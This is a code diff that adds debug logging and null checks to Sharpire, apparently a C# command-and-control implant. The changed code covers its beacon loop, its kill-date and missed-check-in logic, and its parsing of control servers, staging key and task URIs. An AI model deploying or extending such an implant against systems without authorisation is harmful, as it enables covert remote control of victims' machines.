@@ -28,17 +28,43 @@ namespace Sharpire
         
         public Agent(SessionInfo sessionInfo)
         {
+            try
+            {
+                Console.WriteLine($"[DEBUG] Agent() constructor - sessionInfo is null: {sessionInfo == null}");
+                this.sessionInfo = sessionInfo;
 
-            this.sessionInfo = sessionInfo;
-            coms = new Coms(sessionInfo);
-            jobTracking = new JobTracking();
+                Console.WriteLine($"[DEBUG] Agent() constructor - creating Coms");
+                coms = new Coms(sessionInfo);
+
+                Console.WriteLine($"[DEBUG] Agent() constructor - creating JobTracking");
+                jobTracking = new JobTracking();
+
+                Console.WriteLine($"[DEBUG] Agent() constructor - completed successfully");
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine($"[ERROR] Agent() constructor exception: {ex.GetType().Name}: {ex.Message}");
+                Console.WriteLine($"[ERROR] Stack: {ex.StackTrace}");
+                throw;
+            }
         }
         
         public void Execute()
         {
-            while (true)
+            Console.WriteLine($"[DEBUG] Agent.Execute() - starting loop");
+            try
             {
-                Run();
+                while (true)
+                {
+                    Console.WriteLine($"[DEBUG] Agent.Execute() - calling Run()");
+                    Run();
+                }
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine($"[ERROR] Agent.Execute() exception: {ex.GetType().Name}: {ex.Message}");
+                Console.WriteLine($"[ERROR] Stack: {ex.StackTrace}");
+                throw;
             }
         }
         
@@ -49,6 +75,24 @@ namespace Sharpire
         
         private void Run()
         {
+            try
+            {
+                Console.WriteLine($"[DEBUG] Run() - entry");
+                Console.WriteLine($"[DEBUG] Run() - sessionInfo null: {sessionInfo == null}");
+                Console.WriteLine($"[DEBUG] Run() - getting KillDate");
+                DateTime killDate = sessionInfo.GetKillDate();
+                Console.WriteLine($"[DEBUG] Run() - KillDate: {killDate}");
+                Console.WriteLine($"[DEBUG] Run() - getting DefaultLostLimit");
+                int lostLimit = sessionInfo.GetDefaultLostLimit();
+                Console.WriteLine($"[DEBUG] Run() - DefaultLostLimit: {lostLimit}");
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine($"[ERROR] Run() exception during initial checks: {ex.GetType().Name}: {ex.Message}");
+                Console.WriteLine($"[ERROR] Stack: {ex.StackTrace}");
+                throw;
+            }
+
             if (sessionInfo.GetKillDate().CompareTo(DateTime.Now) < 0 || coms.MissedCheckins > sessionInfo.GetDefaultLostLimit())
             {
                 jobTracking.CheckAgentJobs(ref packets, ref coms);
@@ -628,25 +672,34 @@ namespace Sharpire
 
         public SessionInfo(string[] args)
         {
-            ControlServers = args[0].Split(new[] { "," }, StringSplitOptions.RemoveEmptyEntries);  
+            Console.WriteLine($"[DEBUG] SessionInfo() constructor - args.Length: {args?.Length ?? 0}");
+            ControlServers = args[0].Split(new[] { "," }, StringSplitOptions.RemoveEmptyEntries);
+            Console.WriteLine($"[DEBUG] SessionInfo() - ControlServers.Length: {ControlServers.Length}");
             StagingKey = args[1];
             AgentLanguage = args[2];
             StagingKeyBytes = Encoding.ASCII.GetBytes(StagingKey);
             TaskURIs = new string[] {};
+            Console.WriteLine($"[DEBUG] SessionInfo() - TaskURIs initialized as EMPTY array");
             UserAgent = "";
             StagerUserAgent = "";
             StagerURI = "";
             Proxy = "default";
             ProxyCreds = "";
-           
-
         }
 
         public string[] GetControlServers() { return ControlServers; }
         public string GetStagingKey() { return StagingKey; }
         public byte[] GetStagingKeyBytes() { return StagingKeyBytes; }
 
-        public string[] GetTaskUrIs() { return TaskURIs; }
+        public string[] GetTaskUrIs()
+        {
+            Console.WriteLine($"[DEBUG] GetTaskUrIs() - TaskURIs is null: {TaskURIs == null}, Length: {TaskURIs?.Length ?? -1}");
+            if (TaskURIs == null || TaskURIs.Length == 0)
+            {
+                Console.WriteLine($"[ERROR] GetTaskUrIs() - TaskURIs is null or empty! SetProfile() was likely not called.");
+            }
+            return TaskURIs;
+        }
         public string GetUserAgent() { return UserAgent; }
         public double GetDefaultJitter() { return DefaultJitter; }
 
@@ -687,8 +740,33 @@ namespace Sharpire
 
         public void SetProfile(string profile)
         {
-            TaskURIs = profile.Split('|').First().Split(',');
-            UserAgent = profile.Split('|').Last();
+            Console.WriteLine($"[DEBUG] SetProfile() - profile is null/empty: {string.IsNullOrEmpty(profile)}");
+            if (!string.IsNullOrEmpty(profile))
+            {
+                Console.WriteLine($"[DEBUG] SetProfile() - profile value: {profile}");
+                var parts = profile.Split('|');
+                Console.WriteLine($"[DEBUG] SetProfile() - parts.Length: {parts.Length}");
+
+                if (parts.Length > 0 && !string.IsNullOrEmpty(parts[0]))
+                {
+                    TaskURIs = parts[0].Split(',');
+                    Console.WriteLine($"[DEBUG] SetProfile() - TaskURIs.Length: {TaskURIs.Length}");
+                }
+                else
+                {
+                    Console.WriteLine($"[ERROR] SetProfile() - parts[0] is null or empty!");
+                }
+
+                if (parts.Length > 1)
+                {
+                    UserAgent = parts[parts.Length - 1];
+                    Console.WriteLine($"[DEBUG] SetProfile() - UserAgent: {UserAgent}");
+                }
+            }
+            else
+            {
+                Console.WriteLine($"[ERROR] SetProfile() called with null or empty profile!");
+            }
         }
         
         public void SetKillDate(string killDate)
